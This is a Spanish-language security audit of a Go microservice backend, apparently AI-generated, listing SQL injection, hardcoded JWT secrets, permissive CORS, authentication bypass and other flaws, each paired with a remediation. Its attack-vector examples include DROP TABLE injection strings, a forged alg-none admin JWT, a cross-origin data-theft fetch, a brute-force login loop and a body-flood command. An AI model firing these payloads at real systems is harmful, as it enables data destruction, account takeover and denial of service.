# 🔐 Auditoría de Seguridad - Backend Go SICORA

**Fecha:** 7 de enero de 2026  
**Alcance:** `/sicora-be-go/`  
**Auditor:** GitHub Copilot Security Analysis

---

## 📊 Resumen Ejecutivo

| Severidad  | Cantidad |
| ---------- | -------- |
| 🔴 CRÍTICO | 4        |
| 🟠 ALTO    | 5        |
| 🟡 MEDIO   | 6        |
| 🔵 BAJO    | 3        |

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. SQL Injection en ORDER BY - KBService

**Archivo:** [kbservice/internal/infrastructure/repositories/document_repository.go](../../sicora-be-go/kbservice/internal/infrastructure/repositories/document_repository.go#L138)

**Código Vulnerable:**

```go
// Línea 138
query = query.Order(fmt.Sprintf("ts_rank(search_vector, plainto_tsquery('english', '%s')) DESC", criteria.Query))
```

**Severidad:** 🔴 CRÍTICO

**Vector de Ataque:**

```
GET /api/v1/knowledge/search?query=test'); DROP TABLE documents; --
```

**Impacto:** Un atacante puede ejecutar SQL arbitrario inyectando código en el parámetro `query`. Esto permite:

- Extracción de datos de toda la base de datos
- Modificación/eliminación de datos
- Escalada de privilegios

**Remediación:**

```go
// Usar parámetros preparados en lugar de interpolación de strings
if criteria.Query != "" && criteria.SortBy == "" {
    query = query.Order(gorm.Expr("ts_rank(search_vector, plainto_tsquery('english', ?)) DESC", criteria.Query))
}
```

---

### 2. SQL Injection en ORDER BY - Sin Validación

**Archivos Afectados:**

- [evalinservice/internal/infrastructure/repositories/questionnaire_repository_impl.go#L79](../../sicora-be-go/evalinservice/internal/infrastructure/repositories/questionnaire_repository_impl.go#L79)
- [evalinservice/internal/infrastructure/repositories/question_repository_impl.go#L81](../../sicora-be-go/evalinservice/internal/infrastructure/repositories/question_repository_impl.go#L81)
- [evalinservice/internal/infrastructure/repositories/evaluation_repository_impl.go#L269](../../sicora-be-go/evalinservice/internal/infrastructure/repositories/evaluation_repository_impl.go#L269)
- [evalinservice/internal/infrastructure/repositories/evaluation_period_repository_impl.go#L98](../../sicora-be-go/evalinservice/internal/infrastructure/repositories/evaluation_period_repository_impl.go#L98)
- [userservice/internal/infrastructure/database/repositories/postgresql_user_repository.go#L162](../../sicora-be-go/userservice/internal/infrastructure/database/repositories/postgresql_user_repository.go#L162)

**Código Vulnerable (Ejemplo questionnaire_repository_impl.go):**

```go
// Línea 79
query = query.Order(orderBy + " " + orderDir)
```

**Severidad:** 🔴 CRÍTICO

**Vector de Ataque:**

```
GET /api/v1/questionnaires?order_by=name; DROP TABLE users; --&order_dir=DESC
```

**Impacto:** Los parámetros `orderBy` y `orderDir` se concatenan directamente sin validación, permitiendo inyección SQL.

**Remediación:**

```go
// Implementar whitelist de campos permitidos
allowedFields := map[string]bool{"created_at": true, "name": true, "updated_at": true}
allowedDirs := map[string]bool{"asc": true, "desc": true}

if !allowedFields[orderBy] {
    orderBy = "created_at"
}
if !allowedDirs[strings.ToLower(orderDir)] {
    orderDir = "desc"
}

query = query.Order(fmt.Sprintf("%s %s", orderBy, orderDir))
```

---

### 3. JWT Secret Hardcodeado en Producción

**Archivos Afectados:**

- [apigateway/internal/infrastructure/config/config.go#L50](../../sicora-be-go/apigateway/internal/infrastructure/config/config.go#L50)
- [userservice/cmd/server/main.go#L105](../../sicora-be-go/userservice/cmd/server/main.go#L105)
- [userservice/internal/presentation/routes/user_routes.go#L76](../../sicora-be-go/userservice/internal/presentation/routes/user_routes.go#L76)
- [scheduleservice/configs/config.go#L66](../../sicora-be-go/scheduleservice/configs/config.go#L66)

**Código Vulnerable:**

```go
// apigateway/internal/infrastructure/config/config.go:50
JWTSecret: getEnv("JWT_SECRET", "sicora-secret-key-change-in-production"),

// userservice/cmd/server/main.go:105
if jwtSecret == "" {
    jwtSecret = "your-secret-key"
}

// scheduleservice/configs/config.go:66
SecretKey: getEnvOrDefault("JWT_SECRET_KEY", "your-256-bit-secret"),
```

**Severidad:** 🔴 CRÍTICO

**Vector de Ataque:**

1. Si no se configura la variable de entorno, se usa el secret por defecto
2. Un atacante que conoce el secret puede:
   - Forjar tokens JWT válidos para cualquier usuario
   - Escalar privilegios a admin
   - Suplantar cualquier identidad

**Impacto:** Compromiso total de autenticación/autorización.

**Remediación:**

```go
// Fallar si no hay secret configurado en producción
func Load() (*Config, error) {
    jwtSecret := os.Getenv("JWT_SECRET")
    if jwtSecret == "" {
        if os.Getenv("ENVIRONMENT") == "production" {
            return nil, errors.New("JWT_SECRET is required in production")
        }
        jwtSecret = generateRandomSecret() // Para desarrollo solamente
    }
    // Validar longitud mínima del secret
    if len(jwtSecret) < 32 {
        return nil, errors.New("JWT_SECRET must be at least 32 characters")
    }
}
```

---

### 4. CORS Inseguro - AllowOrigins: "\*" con Credentials

**Archivo:** [evalinservice/internal/presentation/middleware/cors_middleware.go](../../sicora-be-go/evalinservice/internal/presentation/middleware/cors_middleware.go#L23-L44)

**Código Vulnerable:**

```go
// Líneas 22-44
func DefaultCORSConfig() *CORSConfig {
    return &CORSConfig{
        AllowOrigins: []string{"*"},  // ❌ Permite cualquier origen
        AllowMethods: []string{...},
        AllowHeaders: []string{...},
        AllowCredentials: true,  // ❌ CON credenciales!
        MaxAge: 86400,
    }
}
```

**Severidad:** 🔴 CRÍTICO

**Vector de Ataque:**

```javascript
// Desde cualquier sitio malicioso
fetch('https://api.sicora.app/api/v1/users', {
  credentials: 'include',
  headers: { Authorization: 'Bearer ' + stolenToken },
})
  .then((r) => r.json())
  .then((data) => sendToAttacker(data));
```

**Impacto:**

- Permite ataques CSRF desde cualquier dominio
- Permite robo de datos sensibles del usuario autenticado
- Los browsers NO permiten `Access-Control-Allow-Origin: *` con credentials, pero el código lo intenta configurar

**Remediación:**

```go
func DefaultCORSConfig() *CORSConfig {
    return &CORSConfig{
        AllowOrigins: []string{
            "https://sicora.app",
            "https://admin.sicora.app",
        },
        AllowCredentials: true,
        // ...
    }
}
```

---

## 🟠 VULNERABILIDADES ALTAS

### 5. Falta de Validación de Algoritmo JWT

**Archivo:** [apigateway/internal/presentation/middleware/auth.go](../../sicora-be-go/apigateway/internal/presentation/middleware/auth.go#L47-L50)

**Código Vulnerable:**

```go
// Líneas 47-50
token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
    return []byte(cfg.JWTSecret), nil  // ❌ No valida el algoritmo
})
```

**Severidad:** 🟠 ALTO

**Vector de Ataque (Algorithm Confusion):**

```bash
# Un atacante puede modificar el header del JWT para usar RS256
# y proporcionar la clave pública como secret
python3 -c "
import jwt
# Token con algoritmo none o cambiado
token = jwt.encode({'user_id': 'admin-uuid', 'role': 'admin'},
                   algorithm='none', key='')
print(token)
"
```

**Impacto:** Bypass de autenticación si se acepta el algoritmo "none" o se confunde el algoritmo.

**Remediación:**

```go
token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
    // Validar explícitamente el algoritmo
    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
    }
    return []byte(cfg.JWTSecret), nil
})
```

**Nota:** El archivo [userservice/internal/infrastructure/auth/jwt_service.go#L61-L64](../../sicora-be-go/userservice/internal/infrastructure/auth/jwt_service.go#L61-L64) SÍ implementa esta validación correctamente.

---

### 6. Debug Mode Habilitado por Defecto

**Archivo:** [scheduleservice/configs/config.go#L52](../../sicora-be-go/scheduleservice/configs/config.go#L52)

**Código Vulnerable:**

```go
// Línea 52
Mode: getEnvOrDefault("SERVER_MODE", "debug"),
```

**Severidad:** 🟠 ALTO

**Impacto:**

- Stack traces expuestos en respuestas de error
- Información detallada de rutas y parámetros
- Posible exposición de datos sensibles en logs

**Remediación:**

```go
Mode: getEnvOrDefault("SERVER_MODE", "release"),
```

---

### 7. SkipPaths Demasiado Permisivo

**Archivo:** [userservice/cmd/server/main.go#L143-L150](../../sicora-be-go/userservice/cmd/server/main.go#L143-L150)

**Código Vulnerable:**

```go
// Líneas 143-150
authConfig := &middleware.AuthConfig{
    JWTService: jwtService,
    SkipPaths: []string{
        "/health",
        "/docs",
        "/swagger",
        "/api/v1/auth",
        "/api/v1/users", // ❌ Peligroso - permite acceso sin auth a TODOS los endpoints de users
    },
}
```

**Severidad:** 🟠 ALTO

**Vector de Ataque:**

```bash
# Acceso a lista de usuarios sin autenticación
curl https://api.sicora.app/api/v1/users
# Acceso a usuario específico
curl https://api.sicora.app/api/v1/users/some-uuid
```

**Impacto:**

- El comentario dice "Only for POST (registration)" pero `shouldSkipAuth` usa `strings.HasPrefix`
- Esto permite acceso sin autenticación a GET/PUT/DELETE en `/api/v1/users/*`

**Remediación:**

```go
SkipPaths: []string{
    "/health",
    "/docs",
    "/swagger",
    "/api/v1/auth/login",
    "/api/v1/auth/register",
    "/api/v1/auth/refresh",
    "/api/v1/auth/forgot-password",
    "/api/v1/auth/reset-password",
},
// O implementar lógica más granular que considere el método HTTP
```

---

### 8. Stack Traces en Logs de Producción

**Archivo:** [userservice/internal/presentation/middleware/error_middleware.go#L43-L44](../../sicora-be-go/userservice/internal/presentation/middleware/error_middleware.go#L43-L44)

**Código Vulnerable:**

```go
// Líneas 43-44
logger.Printf("[%s] Generic error: %v", correlationID, err)
logger.Printf("[%s] Stack trace: %s", correlationID, debug.Stack())
```

**Severidad:** 🟠 ALTO

**Impacto:**

- Expone rutas de archivos internos del servidor
- Revela nombres de funciones y estructura del código
- Puede exponer valores de variables en el stack

**Remediación:**

```go
if os.Getenv("ENVIRONMENT") != "production" {
    logger.Printf("[%s] Stack trace: %s", correlationID, debug.Stack())
}
```

---

### 9. Credenciales en Archivos de Ejemplo

**Archivos Afectados:**

- [.env.example](../../sicora-be-go/.env.example)
- [userservice/.env.example](../../sicora-be-go/userservice/.env.example)
- [projectevalservice/.env.example](../../sicora-be-go/projectevalservice/.env.example)
- [scheduleservice/.env.example](../../sicora-be-go/scheduleservice/.env.example)
- [mevalservice/.env.example](../../sicora-be-go/mevalservice/.env.example)

**Código Vulnerable:**

```dotenv
# Valores que parecen reales/predecibles
DB_PASSWORD=cambia_esto_rw
DB_PASSWORD=postgres
JWT_SECRET=your-super-secret-jwt-key-for-go-userservice
```

**Severidad:** 🟠 ALTO (si se copian directamente a producción)

**Remediación:**

```dotenv
# Usar placeholders claramente no funcionales
DB_PASSWORD=<GENERATE_STRONG_PASSWORD_HERE>
JWT_SECRET=<GENERATE_MIN_32_CHAR_SECRET_HERE>
```

---

## 🟡 VULNERABILIDADES MEDIAS

### 10. Rate Limiter Global Sin Granularidad

**Archivo:** [apigateway/internal/presentation/middleware/middleware.go#L50-L80](../../sicora-be-go/apigateway/internal/presentation/middleware/middleware.go#L50-L80)

**Código:**

```go
func RateLimiter(limit int) gin.HandlerFunc {
    // Simple token bucket - compartido globalmente
    tokens := make(chan struct{}, limit)
    // ...
}
```

**Severidad:** 🟡 MEDIO

**Impacto:**

- Rate limit compartido entre todos los usuarios
- Un atacante puede agotar el límite afectando usuarios legítimos (DoS)
- No hay límite específico por IP o por usuario

**Remediación:**

```go
// Implementar rate limiting por IP
type RateLimiter struct {
    limitersByIP map[string]*rate.Limiter
    mu           sync.Mutex
}

func (rl *RateLimiter) getLimiter(ip string) *rate.Limiter {
    rl.mu.Lock()
    defer rl.mu.Unlock()
    if limiter, exists := rl.limitersByIP[ip]; exists {
        return limiter
    }
    limiter := rate.NewLimiter(rate.Limit(100), 100)
    rl.limitersByIP[ip] = limiter
    return limiter
}
```

---

### 11. Falta Límite de Tamaño en Request Body

**Archivo:** Múltiples handlers no validan tamaño máximo del body.

**Severidad:** 🟡 MEDIO

**Vector de Ataque:**

```bash
# Enviar payload masivo
dd if=/dev/urandom bs=1M count=1000 | curl -X POST \
  -H "Content-Type: application/json" \
  -d @- https://api.sicora.app/api/v1/users
```

**Impacto:** Denegación de servicio por agotamiento de memoria.

**Remediación:**

```go
// En main.go o middleware
router.Use(func(c *gin.Context) {
    c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 10<<20) // 10MB
    c.Next()
})
```

---

### 12. Tokens JWT sin Audience ni Issuer Verificados

**Archivo:** [apigateway/internal/presentation/middleware/auth.go](../../sicora-be-go/apigateway/internal/presentation/middleware/auth.go#L46-L55)

**Código:**

```go
// No verifica audience ni issuer
claims := &Claims{}
token, err := jwt.ParseWithClaims(tokenString, claims, ...)
```

**Severidad:** 🟡 MEDIO

**Impacto:** Un token generado para otro servicio/propósito podría ser reutilizado.

**Remediación:**

```go
if claims.Issuer != "sicora-api" {
    return nil, errors.New("invalid token issuer")
}
if claims.Audience != "sicora-web" {
    return nil, errors.New("invalid token audience")
}
```

---

### 13. No Hay Límite de Intentos de Login

**Archivos Afectados:** Login endpoints no implementan bloqueo temporal.

**Severidad:** 🟡 MEDIO

**Vector de Ataque:**

```bash
# Brute force de credenciales
for i in {1..10000}; do
    curl -X POST https://api.sicora.app/api/v1/auth/login \
         -d '{"email":"admin@sicora.app","password":"attempt'$i'"}'
done
```

**Impacto:** Permite ataques de fuerza bruta contra credenciales.

**Remediación:**

```go
// Implementar contador de intentos fallidos por usuario/IP
func (uc *AuthenticateUserUseCase) Execute(...) {
    // Verificar intentos fallidos recientes
    if failedAttempts := getFailedAttempts(request.Email); failedAttempts >= 5 {
        return nil, errors.New("account temporarily locked")
    }
    // ...
    if authFailed {
        incrementFailedAttempts(request.Email)
    }
}
```

---

### 14. Información Sensible en Logs

**Archivos Afectados:** Múltiples handlers loguean errores completos.

**Ejemplo:**

```go
// userservice/internal/presentation/handlers/user_handler.go:324
h.logger.Printf("Error authenticating user: %v", err)
```

**Severidad:** 🟡 MEDIO

**Impacto:** Los logs pueden contener datos sensibles como emails, IDs de usuario, tokens parciales.

**Remediación:**

```go
// Loguear solo información no sensible
h.logger.Printf("Authentication failed for request ID: %s", requestID)
```

---

### 15. HTTPS No Forzado

**Archivo:** No hay middleware que redirija HTTP a HTTPS.

**Severidad:** 🟡 MEDIO

**Impacto:** Comunicaciones pueden interceptarse si el cliente usa HTTP.

**Remediación:**

```go
// Agregar middleware de redirección HTTPS
func ForceHTTPS() gin.HandlerFunc {
    return func(c *gin.Context) {
        if c.Request.TLS == nil && c.GetHeader("X-Forwarded-Proto") != "https" {
            url := "https://" + c.Request.Host + c.Request.URL.String()
            c.Redirect(http.StatusMovedPermanently, url)
            c.Abort()
            return
        }
        c.Next()
    }
}
```

---

## 🔵 VULNERABILIDADES BAJAS

### 16. Password Reset Token en URL

**Archivo:** [userservice/internal/application/usecases/user_usecases.go#L408](../../sicora-be-go/userservice/internal/application/usecases/user_usecases.go#L408)

**Código:**

```go
resetLink := fmt.Sprintf("https://sicora.app/reset-password?token=%s", resetToken)
```

**Severidad:** 🔵 BAJO

**Impacto:** El token puede quedar en logs del servidor web, historial del browser.

**Remediación:** Usar token de corta duración (15 min) y un solo uso.

---

### 17. Falta de Headers de Seguridad Completos

**Archivo:** [evalinservice/internal/presentation/middleware/cors_middleware.go#L111-L120](../../sicora-be-go/evalinservice/internal/presentation/middleware/cors_middleware.go#L111-L120)

**Código:**

```go
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("X-Frame-Options", "DENY")
        c.Header("X-XSS-Protection", "1; mode=block")
        // Faltan headers importantes
    }
}
```

**Severidad:** 🔵 BAJO

**Remediación:**

```go
c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
c.Header("Content-Security-Policy", "default-src 'self'")
c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
c.Header("Permissions-Policy", "geolocation=(), microphone=()")
```

---

### 18. Información de Versión Expuesta

**Archivos:** Swagger docs exponen versiones de servicios.

**Severidad:** 🔵 BAJO

**Impacto:** Facilita identificar vulnerabilidades conocidas en versiones específicas.

---

## ✅ Buenas Prácticas Encontradas

1. **JWT Service en userservice** valida correctamente el algoritmo de firma
2. **Uso de bcrypt** para hash de contraseñas con costo por defecto
3. **Uso de UUIDs** en lugar de IDs secuenciales
4. **Validación de entrada** con go-validator en DTOs
5. **GORM como ORM** previene SQL injection básico (excepto casos identificados)
6. **Recovery middleware** implementado en todos los servicios
7. **Timeouts configurados** en servidor HTTP
8. **Estructura limpia** separando concerns (handlers, usecases, repositories)

---

## 📋 Plan de Remediación Priorizado

| Prioridad | Vulnerabilidad                | Esfuerzo | Impacto |
| --------- | ----------------------------- | -------- | ------- |
| 1         | SQL Injection en ORDER BY     | Bajo     | Crítico |
| 2         | JWT Secrets hardcodeados      | Bajo     | Crítico |
| 3         | CORS inseguro                 | Bajo     | Crítico |
| 4         | SkipPaths demasiado permisivo | Bajo     | Alto    |
| 5         | Validación de algoritmo JWT   | Bajo     | Alto    |
| 6         | Rate limiting por IP          | Medio    | Medio   |
| 7         | Límite de tamaño en body      | Bajo     | Medio   |
| 8         | Límite de intentos de login   | Medio    | Medio   |
| 9         | Debug mode por defecto        | Bajo     | Alto    |
| 10        | Stack traces en logs          | Bajo     | Alto    |

---

## 🔧 Comandos de Verificación

```bash
# Buscar secrets hardcodeados
grep -r "secret\|password\|apikey" --include="*.go" sicora-be-go/ | grep -v "_test.go"

# Buscar SQL injection potencial
grep -r "fmt.Sprintf.*SELECT\|\.Order.*\+\|\.Raw(" --include="*.go" sicora-be-go/

# Verificar configuración CORS
grep -r "AllowOrigins\|AllowCredentials" --include="*.go" sicora-be-go/

# Buscar debug mode
grep -r "debug\|Debug.*true" --include="*.go" sicora-be-go/
```

---

_Reporte generado automáticamente. Requiere validación manual de cada vulnerabilidad antes de remediación._
